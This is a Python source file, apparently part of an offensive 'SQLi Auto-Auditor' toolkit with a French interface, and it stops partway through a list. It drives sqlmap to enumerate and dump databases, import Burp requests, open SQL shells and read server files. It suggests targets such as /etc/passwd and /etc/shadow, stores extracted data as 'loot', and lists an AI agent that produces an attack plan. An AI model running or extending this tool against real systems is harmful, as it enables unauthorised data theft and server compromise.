#!/usr/bin/env python3
"""
SQLi Auto-Auditor - Portail Interactif d'Exploitation
Interface interactive pour naviguer les resultats et exploiter via sqlmap.
"""

import os
import sys
import json
import subprocess
import shutil
import webbrowser
import requests
import urllib3
urllib3.disable_warnings()
from datetime import datetime

from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.prompt import Prompt, IntPrompt, Confirm
from rich.columns import Columns
from rich.text import Text
from rich.live import Live

console = Console()

BANNER = r"""[bold cyan]
  ___  ___  _    _     ___         _     _ _
 / __|/ _ \| |  (_)   | __|_ ___ _| |___(_) |_
 \__ \ (_) | |__| |   | _|\ \ / _ \ / _ \ |  _|
 |___/\__\_\____|_|   |___/_\_\ .__/_\___/_|\__|
                               |_|
[/bold cyan]
[bold white]Portail Interactif d'Exploitation[/bold white]
[dim]Navigation des resultats | Dump SQLMap | Extraction de donnees[/dim]
"""


from core.loot import LootStore
from core.nosqli import NoSQLiScanner
from core.xss import XSSScanner
from core.recon import SubdomainFinder, TechFingerprinter, DirBuster, PortScanner, WaybackDiscovery, NucleiScanner, FullRecon
from core.osint import DNSEnumerator, WHOISLookup, SecurityHeadersAnalyzer, ShodanLookup, LeakChecker, FullOSINT
from core.ai_agent import AIAnalyzer


class ExploitPortal:
    def __init__(self, report_path="output/report.json", output_dir="output"):
        self.report_path = report_path
        self.output_dir = output_dir
        self.report = None
        self.sqlmap_path = self._find_sqlmap()
        self.current_target = None
        self.discovered_dbs = []
        self.discovered_tables = {}
        self.discovered_columns = {}
        self._post_data = None
        self.loot = LootStore(output_dir)

    def _find_sqlmap(self):
        path = shutil.which("sqlmap")
        if path:
            return path
        for cmd in ["python -m sqlmap", "python3 -m sqlmap"]:
            if shutil.which(cmd.split()[0]):
                return cmd
        return None

    def load_report(self):
        if not os.path.exists(self.report_path):
            console.print(f"[red]Rapport introuvable: {self.report_path}[/red]")
            console.print("[dim]Lancez d'abord: python main.py <url>[/dim]")
            return False
        with open(self.report_path, "r", encoding="utf-8") as f:
            self.report = json.load(f)

        # Init loot for this target
        target_url = self.report.get("target", "")
        if target_url:
            self.loot.set_target(target_url)
            # Save server info from sqlmap results
            sqlmap_results = self.report.get("sqlmap_results", {})
            if sqlmap_results:
                server_info = {}
                for key, result in sqlmap_results.items():
                    if isinstance(result, dict):
                        if result.get("dbms"):
                            server_info["DBMS"] = result["dbms"]
                        if result.get("os"):
                            server_info["OS"] = result["os"]
                        if result.get("technology"):
                            server_info["Technology"] = result["technology"]
                if server_info:
                    self.loot.set_server_info(server_info)
        return True

    def _run_sqlmap(self, args, live_output=True):
        """Run sqlmap with given args, return output lines."""
        if not self.sqlmap_path:
            console.print("[red]sqlmap non trouve ![/red]")
            return []

        # Build command, avoid duplicating --force-ssl
        cmd = self.sqlmap_path.split() + args + ["--batch"]
        if "--force-ssl" not in cmd:
            target_url = self.current_target.get("url", "") if self.current_target else ""
            if "https://" in target_url:
                cmd.append("--force-ssl")
        console.print(f"\n  [bold cyan]$[/bold cyan] {' '.join(cmd)}\n")

        try:
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                stdin=subprocess.DEVNULL,
                text=True,
                bufsize=1,
            )

            output = []
            for line in iter(process.stdout.readline, ""):
                line = line.rstrip()
                output.append(line)
                if live_output:
                    if any(kw in line for kw in ["[INFO]", "available databases", "Database:", "Table:", "Column:"]):
                        console.print(f"  [dim]{line}[/dim]")
                    elif any(kw in line.lower() for kw in ["injectable", "vulnerable", "payload", "fetched", "dumped"]):
                        console.print(f"  [bold green]{line}[/bold green]")
                    elif "[*]" in line:
                        console.print(f"  [cyan]{line}[/cyan]")
                    elif "[WARNING]" in line:
                        console.print(f"  [yellow]{line}[/yellow]")
                    elif "[ERROR]" in line or "[CRITICAL]" in line:
                        console.print(f"  [red]{line}[/red]")

            process.wait(timeout=600)

            # Auto-detect server info from output
            self._extract_server_info(output)

            return output

        except subprocess.TimeoutExpired:
            process.kill()
            console.print("[red]Timeout (10 min)[/red]")
            return []
        except Exception as e:
            console.print(f"[red]Erreur: {e}[/red]")
            return []

    def _build_target_args(self):
        """Build sqlmap args for the current target."""
        if not self.current_target:
            return []

        t = self.current_target

        # Burp import: use -r with the raw request file (preserves all headers)
        if t.get("burp_raw"):
            request_file = t.get("request_file")
            args = ["-r", request_file]
            if t.get("param"):
                args.extend(["-p", t["param"]])
            if "https://" in t.get("url", ""):
                args.append("--force-ssl")
            return args

        # Try to build full URL from request file (has all params)
        self._post_data = None
        request_file = t.get("request_file")
        if request_file and os.path.exists(request_file):
            full_url = self._parse_request_file_url(request_file)
            if full_url:
                args = ["-u", full_url]
                if self._post_data:
                    args.extend(["--data", self._post_data])
                if t.get("param"):
                    args.extend(["-p", t["param"]])
                if "https://" in full_url:
                    args.append("--force-ssl")
                return args

        # Fallback: use URL from injection point
        url = t.get("url", "")
        if url.startswith("http://") and self._is_https_target():
            url = "https://" + url[7:]

        args = ["-u", url]
        if t.get("param"):
            args.extend(["-p", t["param"]])
        if "https://" in url:
            args.append("--force-ssl")
        return args

    def _parse_request_file_url(self, request_file):
        """Parse a request file and build the full URL with params."""
        try:
            with open(request_file, "r") as f:
                lines = f.read().strip().split("\n")

            first_line = lines[0]
            parts = first_line.split(" ")
            if len(parts) < 2:
                return None

            method = parts[0]
            path_query = parts[1]

            host = ""
            for line in lines[1:]:
                if line.lower().startswith("host:"):
                    host = line.split(":", 1)[1].strip()
                    break

            if not host:
                return None

            # Detect HTTPS from target or report
            scheme = "https" if self._is_https_target() else "http"
            full_url = f"{scheme}://{host}{path_query}"

            # For POST: append body params if needed
            if method == "POST":
                # Find body after blank line
                body = ""
                blank_found = False
                for line in lines:
                    if blank_found:
                        body += line
                    elif line.strip() == "":
                        blank_found = True
                # Store POST data separately - sqlmap needs --data
                if body.strip():
                    self._post_data = body.strip()

            return full_url
        except Exception:
            return None

    def _is_https_target(self):
        target = self.report.get("target", "") if self.report else ""
        return "https://" in target

    def _extract_server_info(self, output):
        """Auto-extract DBMS, OS, web server from sqlmap output and save to loot."""
        info = {}
        for line in output:
            lower = line.lower()
            # "back-end DBMS: MySQL >= 5.1"
            if "back-end dbms:" in lower:
                info["DBMS"] = line.split(":", 1)[-1].strip()
            # "web server operating system: Linux Debian"
            elif "web server operating system:" in lower:
                info["OS"] = line.split(":", 1)[-1].strip()
            # "web application technology: Apache 2.2.22, PHP 5.4.4"
            elif "web application technology:" in lower:
                tech = line.split(":", 1)[-1].strip()
                info["Technology"] = tech
                # Try to extract web server name
                for part in tech.split(","):
                    part = part.strip()
                    if any(ws in part.lower() for ws in ("apache", "nginx", "iis", "lighttpd")):
                        info["Web Server"] = part
        if info:
            self.loot.set_server_info(info)

    # ═══════════════════════════════════════════
    # MENUS
    # ═══════════════════════════════════════════

    def main_menu(self):
        while True:
            console.print(BANNER)

            target_info = self.report.get("target", "?")[:80] if self.report else "?"
            scan_date = self.report.get("scan_date", "?")[:19] if self.report else "?"
            total_points = len(self.report.get("injection_points", [])) if self.report else 0
            confirmed = sum(1 for p in self.report.get("injection_points", [])
                           if "CONFIRME" in " ".join(p.get("reasons", []))) if self.report else 0
            sqlmap_vulns = self.report.get("sqlmap_results", {}).get("vulnerable", 0) if self.report else 0

            info_panel = (
                f"[bold]Cible:[/bold] {target_info}\n"
                f"[bold]Scan:[/bold] {scan_date}\n"
                f"[bold]Points d'injection:[/bold] {total_points} | "
                f"[bold]Confirmes:[/bold] [red]{confirmed}[/red] | "
                f"[bold]SQLMap vulns:[/bold] [red]{sqlmap_vulns}[/red]\n"
                f"[bold]SQLMap:[/bold] {'[green]OK[/green]' if self.sqlmap_path else '[red]NON TROUVE[/red]'}"
            )
            if self.current_target:
                info_panel += f"\n[bold]Cible active:[/bold] [yellow]{self.current_target.get('param', '?')} @ {self.current_target.get('url', '?')[:60]}[/yellow]"

            console.print(Panel(info_panel, title="Dashboard", border_style="cyan"))

            table = Table(show_header=False, border_style="dim", pad_edge=False, box=None)
            table.add_column("Key", style="bold cyan", width=6)
            table.add_column("Action")

            table.add_row("[1]", "Voir les points d'injection")
            table.add_row("[2]", "Selectionner une cible")
            table.add_row("[B]", "[bold yellow]Importer requete Burp[/bold yellow]  (coller/fichier)")
            table.add_row("[3]", "Enumerer les bases de donnees  (--dbs)")
            table.add_row("[4]", "Enumerer les tables            (--tables)")
            table.add_row("[5]", "Enumerer les colonnes          (--columns)")
            table.add_row("[6]", "Dump une table                 (--dump)")
            table.add_row("[7]", "Dump toute la base             (--dump-all)")
            table.add_row("[8]", "Lire un fichier serveur        (--file-read)")
            table.add_row("[9]", "Shell SQL interactif           (--sql-shell)")
            table.add_row("[S]", "[bold yellow]Requete SQL formatee[/bold yellow]   (--sql-query)")
            table.add_row("[10]", "Commande sqlmap custom")
            table.add_row("[11]", "Voir le rapport HTML")
            table.add_row("", "")
            table.add_row("[N]", "[bold magenta]Scan NoSQLi[/bold magenta]  (MongoDB, CouchDB)")
            table.add_row("[X]", "[bold magenta]Scan XSS[/bold magenta]     (Reflected, DOM, Stored)")
            table.add_row("", "")
            table.add_row("[R]", "[bold blue]Reconnaissance[/bold blue]  (subdomains, dirs, ports, tech, wayback)")
            table.add_row("[O]", "[bold blue]OSINT[/bold blue]           (DNS, WHOIS, headers secu, Shodan)")
            table.add_row("[A]", "[bold red]Agent IA[/bold red]        (analyse, correlation, plan d'attaque)")
            table.add_row("[K]", "[bold blue]Kibana / ELK[/bold blue]   (query Elasticsearch)")
            table.add_row("", "")
            table.add_row("[L]", "[bold green]Page Loot[/bold green] (toutes les donnees collectees)")
            table.add_row("[0]", "Quitter")

            console.print(table)
            console.print()

            all_choices = ["0","1","2","b","B","3","4","5","6","7","8","9","s","S","10","11",
                           "n","N","x","X","r","R","o","O","a","A","k","K","l","L"]
            choice = Prompt.ask("[bold]Choix", choices=all_choices, default="1")

            if choice == "0":
                console.print("[dim]Au revoir.[/dim]")
                break
            elif choice == "1":
                self.show_injection_points()
            elif choice == "2":
                self.select_target()
            elif choice.lower() == "b":
                self.import_burp_request()
            elif choice == "3":
                self.enum_databases()
            elif choice == "4":
                self.enum_tables()
            elif choice == "5":
                self.enum_columns()
            elif choice == "6":
                self.dump_table()
            elif choice == "7":
                self.dump_all()
            elif choice == "8":
                self.file_read()
            elif choice == "9":
                self.sql_shell()
            elif choice.lower() == "s":
                self.sql_query()
            elif choice == "10":
                self.custom_sqlmap()
            elif choice == "11":
                self.open_report()
            elif choice.lower() == "n":
                self.nosqli_scan()
            elif choice.lower() == "x":
                self.xss_scan()
            elif choice.lower() == "r":
                self.recon_menu()
            elif choice.lower() == "o":
                self.osint_menu()
            elif choice.lower() == "a":
                self.ai_analysis()
            elif choice.lower() == "k":
                self.kibana_elk()
            elif choice.lower() == "l":
                self.open_loot()

    def import_burp_request(self):
        """Import a raw HTTP request from Burp Suite (paste or file)."""
        console.clear()
        console.print(Panel(
            "[bold]Importer une requete Burp Suite[/bold]\n\n"
            "Deux options:\n"
            "  [cyan][1][/cyan] Coller la requete brute (terminer par une ligne vide puis ENTREE)\n"
            "  [cyan][2][/cyan] Charger depuis un fichier .txt\n\n"
            "[dim]La requete sera sauvegardee et utilisee comme cible sqlmap.[/dim]",
            title="Import Burp",
            border_style="yellow",
        ))

        choice = Prompt.ask("[bold]Option", choices=["1", "2"], default="1")

        raw_request = ""
        if choice == "1":
            console.print("\n[bold]Collez la requete HTTP brute ci-dessous.[/bold]")
            console.print("[dim](Terminez par une ligne vide puis tapez FIN)[/dim]\n")

            lines = []
            while True:
                try:
                    line = input()
                    if line.strip().upper() == "FIN":
                        break
                    lines.append(line)
                except EOFError:
                    break

            raw_request = "\n".join(lines)
        else:
            filepath = Prompt.ask("[bold]Chemin du fichier")
            if os.path.exists(filepath):
                with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
                    raw_request = f.read()
            else:
                console.print(f"[red]Fichier introuvable: {filepath}[/red]")
                Prompt.ask("\n[dim]Entree pour continuer[/dim]")
                return

        if not raw_request.strip():
            console.print("[red]Requete vide.[/red]")
            Prompt.ask("\n[dim]Entree pour continuer[/dim]")
            return

        # Parse the raw request
        lines = raw_request.strip().split("\n")
        first_line = lines[0].strip()
        parts = first_line.split(" ")
        method = parts[0] if parts else "GET"
        path_query = parts[1] if len(parts) >= 2 else "/"

        # Extract Host header
        host = ""
        scheme = "https"
        headers_section = True
        body = ""
        blank_found = False

        for line in lines[1:]:
            if blank_found:
                body += line + "\n"
            elif line.strip() == "":
                blank_found = True
            else:
                if line.lower().startswith("host:"):
                    host = line.split(":", 1)[1].strip()

        body = body.strip()

        if not host:
            console.print("[red]Header 'Host:' introuvable dans la requete.[/red]")
            Prompt.ask("\n[dim]Entree pour continuer[/dim]")
            return

        full_url = f"{scheme}://{host}{path_query}"

        # Ask which parameter to target
        console.print(f"\n[bold]Requete parsee:[/bold]")
        console.print(f"  Methode: [cyan]{method}[/cyan]")
        console.print(f"  URL: [cyan]{full_url[:100]}[/cyan]")
        if body:
            console.print(f"  Body: [cyan]{body[:100]}[/cyan]")

        # Show all params found
        from urllib.parse import parse_qs, urlparse
        parsed = urlparse(full_url)
        url_params = parse_qs(parsed.query, keep_blank_values=True)
        body_params = parse_qs(body, keep_blank_values=True) if body else {}

        all_params = []
        for pname in url_params:
            all_params.append((pname, "URL (GET)", url_params[pname][0] if url_params[pname] else ""))
        for pname in body_params:
            all_params.append((pname, "Body (POST)", body_params[pname][0] if body_params[pname] else ""))

        if all_params:
            table = Table(title="Parametres detectes", border_style="cyan")
            table.add_column("#", width=4)
            table.add_column("Parametre", style="bold")
            table.add_column("Source")
            table.add_column("Valeur", max_width=30)
            for idx, (pname, src, val) in enumerate(all_params, 1):
                table.add_row(str(idx), pname, src, val[:30])
            console.print(table)

        target_param = Prompt.ask("\n[bold]Parametre a cibler avec sqlmap (ou * pour tous)", default=all_params[0][0] if all_params else "")

        # Save the raw request to a file
        request_file = os.path.join(self.output_dir, "burp_request.txt")
        os.makedirs(self.output_dir, exist_ok=True)
        with open(request_file, "w", encoding="utf-8") as f:
            f.write(raw_request)

        console.print(f"\n[green]Requete sauvegardee: {request_file}[/green]")

        # Set as current target
        self.current_target = {
            "url": full_url,
            "param": target_param if target_param != "*" else "",
            "method": method,
            "source": "burp_import",
            "score": 999,
            "request_file": request_file,
            "burp_raw": True,
            "body": body,
        }

        console.print(Panel(
            f"[bold green]Cible configuree depuis Burp ![/bold green]\n\n"
            f"Methode: {method}\n"
            f"URL: {full_url[:80]}\n"
            f"Parametre: {target_param}\n"
            f"Body: {body[:60] if body else '(aucun)'}\n\n"
            f"[dim]Utilisez maintenant [3] --dbs, [6] --dump, etc.[/dim]",
            title="Import OK",
            border_style="green",
        ))

        Prompt.ask("\n[dim]Entree pour continuer[/dim]")

    def show_injection_points(self):
        console.clear()
        points = self.report.get("injection_points", [])
        if not points:
            console.print("[yellow]Aucun point d'injection.[/yellow]")
            Prompt.ask("\n[dim]Entree pour continuer[/dim]")
            return

        # Show confirmed first, then others
        confirmed = [p for p in points if "CONFIRME" in " ".join(p.get("reasons", []))]
        sqlmap_details = self.report.get("sqlmap_results", {}).get("details", [])

        # Find the sqlmap-confirmed injectable params
        sqlmap_confirmed = set()
        for d in sqlmap_details:
            for v in d.get("vulnerabilities", []):
                if "is vulnerable" in v.lower() or "injectable" in v.lower():
                    # Extract param name
                    for token in ["parameter '", "parameter '"]:
                        if token in v.lower():
                            start = v.lower().index(token) + len(token)
                            end = v.index("'", start + 1) if "'" in v[start+1:] else len(v)
                            sqlmap_confirmed.add(v[start:end])

        table = Table(title=f"Points d'Injection ({len(points)} total, {len(confirmed)} confirmes)", border_style="red")
        table.add_column("#", style="dim", width=4)
        table.add_column("Score", justify="right", width=6)
        table.add_column("Priorite", width=10)
        table.add_column("Param", style="bold")
        table.add_column("Method", width=7)
        table.add_column("Source", width=15)
        table.add_column("SQLMap", width=10)
        table.add_column("URL", max_width=45)

        for idx, p in enumerate(points[:50], 1):
            priority = p["priority"]
            style = {"CRITIQUE": "bold red", "HAUT": "red", "MOYEN": "yellow", "BAS": "dim"}.get(priority, "dim")
            is_confirmed = "CONFIRME" in " ".join(p.get("reasons", []))
            is_sqlmap = p["param"] in sqlmap_confirmed

            sqlmap_status = ""
            if is_sqlmap:
                sqlmap_status = "[bold red]VULN[/bold red]"
            elif is_confirmed:
                sqlmap_status = "[yellow]probe[/yellow]"

            table.add_row(
                str(idx),
                str(p["score"]),
                f"[{style}]{priority}[/{style}]",
                p["param"],
                p["method"],
                p["source"],
                sqlmap_status,
                p["url"][:45],
            )

        console.print(table)

        # Show sqlmap payloads if any
        for d in sqlmap_details:
            vulns = d.get("vulnerabilities", [])
            payload_lines = [v for v in vulns if "Payload:" in v or "Type:" in v or "Title:" in v or "is vulnerable" in v.lower()]
            if payload_lines:
                console.print(Panel(
                    "\n".join(payload_lines[:15]),
                    title="Payloads SQLMap confirmes",
                    border_style="red",
                ))

        Prompt.ask("\n[dim]Entree pour continuer[/dim]")

    def select_target(self):
        console.clear()
        points = self.report.get("injection_points", [])

        # Filter to unique confirmed points
        confirmed = []
        seen = set()
        for p in points:
            if "CONFIRME" in " ".join(p.get("reasons", [])):
                key = (p["url"], p["param"])
                if key not in seen:
                    seen.add(key)
                    confirmed.append(p)

        if not confirmed:
            # Fall back to top scored points
            for p in points[:10]:
                key = (p["url"], p["param"])
                if key not in seen:
                    seen.add(key)
                    confirmed.append(p)

        table = Table(title="Selectionner une cible", border_style="cyan")
        table.add_column("#", width=4)
        table.add_column("Score", width=6)
        table.add_column("Param", style="bold")
        table.add_column("Source")
        table.add_column("URL", max_width=60)

        for idx, p in enumerate(confirmed, 1):
            table.add_row(str(idx), str(p["score"]), p["param"], p["source"], p["url"][:60])

        console.print(table)

        choice = IntPrompt.ask("\n[bold]Numero de la cible", default=1)
        if 1 <= choice <= len(confirmed):
            selected = confirmed[choice - 1]

            # Find matching request file
            request_file = None
            for rf in self.report.get("request_files", []):
                if selected["param"] in rf.get("params", []):
                    request_file = rf.get("file")
                    break

            self.current_target = {
                "url": selected["url"],
                "param": selected["param"],
                "method": selected["method"],
                "source": selected["source"],
                "score": selected["score"],
                "request_file": request_file,
            }
            console.print(f"\n[bold green]Cible selectionnee: {selected['param']} @ {selected['url'][:60]}[/bold green]")
        else:
            console.print("[yellow]Choix invalide.[/yellow]")

        Prompt.ask("\n[dim]Entree pour continuer[/dim]")

    def _ensure_target(self):
        if not self.current_target:
            console.print("[yellow]Aucune cible selectionnee. Utilisez l'option [2] d'abord.[/yellow]")
            Prompt.ask("\n[dim]Entree pour continuer[/dim]")
            return False
        return True

    def enum_databases(self):
        console.clear()
        if not self._ensure_target():
            return

        console.print(Panel(
            f"[bold]Cible:[/bold] {self.current_target['param']} @ {self.current_target['url'][:60]}\n"
            f"[bold]Action:[/bold] Enumeration des bases de donnees (--dbs)",
            title="Enum Databases",
            border_style="cyan",
        ))

        args = self._build_target_args() + ["--dbs"]
        output = self._run_sqlmap(args)

        # Parse databases from output
        dbs = []
        capture = False
        for line in output:
            if "available databases" in line.lower():
                capture = True
                continue
            if capture and line.strip().startswith("[*]"):
                db = line.strip().replace("[*]", "").strip()
                if db:
                    dbs.append(db)
            elif capture and not line.strip():
                capture = False

        if dbs:
            self.discovered_dbs = dbs
            table = Table(title="Bases de donnees trouvees", border_style="green")
            table.add_column("#", width=4)
            table.add_column("Database", style="bold green")
            for idx, db in enumerate(dbs, 1):
                table.add_row(str(idx), db)
            console.print(table)

            # Save to loot
            self.loot.add_entry(
                "databases", "Bases de donnees",
                [{"name": db} for db in dbs],
                columns=["name"],
            )
        else:
            console.print("[yellow]Aucune base detectee dans la sortie. Verifiez les logs ci-dessus.[/yellow]")

        Prompt.ask("\n[dim]Entree pour continuer[/dim]")

    def enum_tables(self):
        console.clear()
        if not self._ensure_target():
            return

        db_name = None
        if self.discovered_dbs:
            console.print("[bold]Bases de donnees connues:[/bold]")
            for idx, db in enumerate(self.discovered_dbs, 1):
                console.print(f"  [{idx}] {db}")
            console.print(f"  [0] Entrer manuellement")
            console.print(f"  [a] Toutes les bases")

            choice = Prompt.ask("\n[bold]Choix", default="1")
            if choice.lower() == "a":
                db_name = None
            elif choice == "0":
                db_name = Prompt.ask("[bold]Nom de la base")
            elif choice.isdigit() and 1 <= int(choice) <= len(self.discovered_dbs):
                db_name = self.discovered_dbs[int(choice) - 1]
        else:
            db_name = Prompt.ask("[bold]Nom de la base (vide = toutes)", default="")
            if not db_name:
                db_name = None

        console.print(Panel(
            f"[bold]Cible:[/bold] {self.current_target['param']}\n"
            f"[bold]Base:[/bold] {db_name or 'TOUTES'}\n"
            f"[bold]Action:[/bold] Enumeration des tables (--tables)",
            title="Enum Tables",
            border_style="cyan",
        ))

        args = self._build_target_args() + ["--tables"]
        if db_name:
            args.extend(["-D", db_name])

        output = self._run_sqlmap(args)

        # Parse tables
        tables = []
        current_db = db_name or ""
        for line in output:
            if "Database:" in line:
                current_db = line.split("Database:")[-1].strip()
            if line.strip().startswith("[") and line.strip().endswith("]"):
                continue
            if "|" in line:
                table_name = line.strip().strip("|").strip()
                if table_name and table_name != "Table" and "---" not in table_name:
                    tables.append((current_db, table_name))

        if tables:
            self.discovered_tables[db_name or "__all__"] = tables
            table = Table(title="Tables trouvees", border_style="green")
            table.add_column("#", width=4)
            table.add_column("Database")
            table.add_column("Table", style="bold green")
            for idx, (db, tbl) in enumerate(tables, 1):
                table.add_row(str(idx), db, tbl)
            console.print(table)

            # Save to loot
            self.loot.add_entry(
                "tables", f"Tables - {db_name or 'toutes'}",
                [{"database": db, "table": tbl} for db, tbl in tables],
                columns=["database", "table"],
            )

        Prompt.ask("\n[dim]Entree pour continuer[/dim]")

    def _select_db_table(self, prompt_db="Nom de la base", prompt_tbl="Nom de la table"):
        """Interactive DB and table selection from discovered data."""
        db_name = None
        table_name = None

        # Select database
        if self.discovered_dbs:
            console.print("[bold]Bases de donnees connues:[/bold]")
            user_dbs = [db for db in self.discovered_dbs if db.lower() not in ("information_schema", "mysql", "performance_schema", "sys")]
            for idx, db in enumerate(user_dbs, 1):
                console.print(f"  [{idx}] {db}")
            console.print(f"  [0] Entrer manuellement")
            choice = Prompt.ask(f"\n[bold]{prompt_db}", default="1")
            if choice == "0":
                db_name = Prompt.ask("[bold]Nom de la base")
            elif choice.isdigit() and 1 <= int(choice) <= len(user_dbs):
                db_name = user_dbs[int(choice) - 1]
            else:
                db_name = choice
        else:
            db_name = Prompt.ask(f"[bold]{prompt_db}")

        # Select table
        all_tables = []
        for key, tables in self.discovered_tables.items():
            for db, tbl in tables:
                if db == db_name or key == db_name:
                    all_tables.append(tbl)

        if all_tables:
            console.print(f"\n[bold]Tables connues dans [{db_name}]:[/bold]")
            for idx, tbl in enumerate(all_tables, 1):
                console.print(f"  [{idx}] {tbl}")
            console.print(f"  [0] Entrer manuellement")
            choice = Prompt.ask(f"\n[bold]{prompt_tbl}", default="1")
            if choice == "0":
                table_name = Prompt.ask("[bold]Nom de la table")
            elif choice.isdigit() and 1 <= int(choice) <= len(all_tables):
                table_name = all_tables[int(choice) - 1]
            else:
                table_name = choice
        else:
            table_name = Prompt.ask(f"[bold]{prompt_tbl}")

        return db_name, table_name

    def enum_columns(self):
        console.clear()
        if not self._ensure_target():
            return

        db_name, table_name = self._select_db_table()

        console.print(Panel(
            f"[bold]Base:[/bold] {db_name} | [bold]Table:[/bold] {table_name}\n"
            f"[bold]Action:[/bold] Enumeration des colonnes (--columns)",
            title="Enum Columns",
            border_style="cyan",
        ))

        args = self._build_target_args() + ["--columns", "-D", db_name, "-T", table_name]
        output = self._run_sqlmap(args)

        # Parse columns
        columns = []
        for line in output:
            if "|" in line and "---" not in line:
                parts = [p.strip() for p in line.split("|") if p.strip()]
                if len(parts) >= 2 and parts[0] not in ("Column", "Table"):
                    columns.append(parts)

        if columns:
            self.discovered_columns[f"{db_name}.{table_name}"] = columns
            table = Table(title=f"Colonnes de {db_name}.{table_name}", border_style="green")
            table.add_column("#", width=4)
            table.add_column("Colonne", style="bold green")
            table.add_column("Type")
            for idx, col in enumerate(columns, 1):
                table.add_row(str(idx), col[0], col[1] if len(col) > 1 else "?")
            console.print(table)

        Prompt.ask("\n[dim]Entree pour continuer[/dim]")

    def dump_table(self):
        console.clear()
        if not self._ensure_target():
            return

        db_name, table_name = self._select_db_table()

        # Optional: specific columns
        columns = Prompt.ask("[bold]Colonnes specifiques (virgule, vide = toutes)", default="")
        # Optional: limit rows
        limit = Prompt.ask("[bold]Limite de lignes (vide = tout)", default="")

        args_display = f"-D {db_name} -T {table_name}"

        console.print(Panel(
            f"[bold]Base:[/bold] {db_name} | [bold]Table:[/bold] {table_name}\n"
            f"[bold]Colonnes:[/bold] {columns or 'TOUTES'}\n"
            f"[bold]Limite:[/bold] {limit or 'AUCUNE'}\n"
            f"[bold]Action:[/bold] Dump des donnees (--dump)",
            title="Dump Table",
            border_style="red",
        ))

        if not Confirm.ask("[bold yellow]Confirmer le dump ?[/bold yellow]", default=True):
            return

        args = self._build_target_args() + ["--dump", "-D", db_name, "-T", table_name]
        if columns:
            args.extend(["-C", columns])
        if limit:
            args.extend(["--start", "1", "--stop", limit])

        output = self._run_sqlmap(args)

        # Show dump location
        dump_dir = os.path.join(self.output_dir, "sqlmap_results")
        console.print(f"\n[bold green]Dump sauvegarde dans: {dump_dir}[/bold green]")

        # Display table data from output
        data_lines = []
        in_table = False
        for line in output:
            if "+-" in line and "-+" in line:
                in_table = True
                data_lines.append(line)
            elif in_table:
                data_lines.append(line)
                if "+-" in line and "-+" in line and len(data_lines) > 2:
                    # End of table
                    pass

        if data_lines:
            console.print(Panel("\n".join(data_lines[:50]), title="Donnees extraites", border_style="green"))
            if len(data_lines) > 50:
                console.print(f"[dim]... {len(data_lines) - 50} lignes supplementaires dans le fichier de dump[/dim]")

        # Auto-import CSV dumps into loot
        self._import_csv_dumps_to_loot()

        Prompt.ask("\n[dim]Entree pour continuer[/dim]")

    def _import_csv_dumps_to_loot(self):
        """Scan for CSV dumps from sqlmap and import them into loot."""
        import csv
        dump_dirs = [
            os.path.join(self.output_dir, "sqlmap_results"),
            os.path.join(os.path.expanduser("~"), "AppData", "Local", "sqlmap", "output"),
        ]
        for base_dir in dump_dirs:
            if not os.path.exists(base_dir):
                continue
            for root, dirs, files in os.walk(base_dir):
                for fname in files:
                    if not fname.endswith(".csv") or fname.startswith("results-"):
                        continue
                    fpath = os.path.join(root, fname)
                    table_name = fname.replace(".csv", "")
                    # Detect database from path
                    parts = root.replace("\\", "/").split("/")
                    db_name = ""
                    if "dump" in parts:
                        idx = parts.index("dump")
                        if idx + 1 < len(parts):
                            db_name = parts[idx + 1]

                    try:
                        with open(fpath, "r", encoding="utf-8", errors="replace") as f:
                            reader = csv.DictReader(f)
                            rows = []
                            for i, row in enumerate(reader):
                                if i >= 200:  # Limit per table
                                    break
                                rows.append(dict(row))
                        if rows:
                            title = f"{db_name}.{table_name}" if db_name else table_name
                            cols = list(rows[0].keys())
                            self.loot.add_entry("dump", title, rows, columns=cols)
                    except Exception:
                        continue

    def dump_all(self):
        console.clear()
        if not self._ensure_target():
            return

        db_name = Prompt.ask("[bold]Nom de la base (vide = toutes)", default="")

        warning = (
            "[bold red]ATTENTION[/bold red]\n\n"
            "dump-all peut prendre beaucoup de temps\n"
            "et generer un trafic important vers la cible.\n"
            f"Base ciblee: {db_name or 'TOUTES'}"
        )
        console.print(Panel(warning, border_style="red"))

        if not Confirm.ask("[bold yellow]Confirmer le dump complet ?[/bold yellow]", default=False):
            return

        args = self._build_target_args()
        if db_name:
            args.extend(["--dump", "-D", db_name])
        else:
            args.extend(["--dump-all", "--exclude-sysdbs"])

        output = self._run_sqlmap(args)

        dump_dir = os.path.join(self.output_dir, "sqlmap_results")
        console.print(f"\n[bold green]Dump complet sauvegarde dans: {dump_dir}[/bold green]")

        # List dumped files
        if os.path.exists(dump_dir):
            for root, dirs, files in os.walk(dump_dir):
                for f in files:
                    if f.endswith(".csv"):
                        path = os.path.join(root, f)
                        size = os.path.getsize(path)
                        console.print(f"  [green]{path}[/green] ({size} bytes)")

        # Auto-import CSV dumps into loot
        self._import_csv_dumps_to_loot()
        console.print(f"\n  [dim]Donnees sauvegardees dans le loot: {self.loot.get_html_path()}[/dim]")

        Prompt.ask("\n[dim]Entree pour continuer[/dim]")

    def _build_file_suggestions(self):
        """Build file read suggestions based on detected server technology."""
        # Get detected info from loot or sqlmap results
        server_info = self.loot.data.get("server_info", {}) if self.loot.data else {}
        os_info = server_info.get("OS", "").lower()
        dbms_info = server_info.get("DBMS", "").lower()
        tech_info = server_info.get("Technology", "").lower()
        web_info = server_info.get("Web Server", "").lower()

        suggestions = []

        # Always include basic system files
        suggestions.append(("Systeme", [
            ("/etc/passwd", "Utilisateurs systeme"),
            ("/etc/shadow", "Hash mots de passe (root requis)"),
            ("/etc/hostname", "Nom du serveur"),
            ("/etc/hosts", "Resolution DNS locale"),
            ("/proc/version", "Version kernel Linux"),
        ]))

        # Web server detection
        web_paths = []
        if "nginx" in web_info or "nginx" in tech_info:
            web_paths += [
                ("/etc/nginx/nginx.conf", "Config principale Nginx"),
                ("/etc/nginx/sites-enabled/default", "VirtualHost Nginx"),
                ("/var/log/nginx/error.log", "Logs erreurs Nginx"),
                ("/var/log/nginx/access.log", "Logs acces Nginx"),
            ]
        if "apache" in web_info or "apache" in tech_info or not web_info:
            web_paths += [
                ("/etc/apache2/apache2.conf", "Config principale Apache"),
                ("/etc/apache2/sites-enabled/000-default", "VirtualHost par defaut"),
                ("/var/log/apache2/error.log", "Logs erreurs Apache"),
            ]
        # Common web app files
        web_paths += [
